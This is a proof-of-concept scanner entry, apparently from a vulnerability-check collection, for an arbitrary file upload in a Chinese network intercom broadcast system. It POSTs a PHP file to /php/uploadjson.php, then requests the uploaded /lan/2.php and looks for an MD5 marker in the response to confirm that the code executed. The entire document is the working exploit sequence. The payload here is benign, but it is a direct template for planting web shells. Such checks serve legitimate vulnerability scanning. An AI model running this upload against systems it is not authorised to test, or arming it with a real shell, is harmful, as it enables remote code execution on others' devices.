{
        'name': '网络对讲广播系统 /uploadjson.php 任意文件上传',
        'poc':[{'requests':{
            'method': 'post',
            'payload': '/php/uploadjson.php',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Connection': 'close',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Accept-Encoding': 'gzip'
            },
            'data': """jsondata[filename]=2.php&jsondata[data]=<?php echo md5('123456');?>""",
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': False,
            'text': False
        }},
        {'requests':{
            'method': 'get',
            'payload': '/lan/2.php',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Connection': 'close',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Accept-Encoding': 'gzip'
            },
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': False,
            'text': 'e10adc3949ba59abbe56e057f20f883e'
        }}]
    }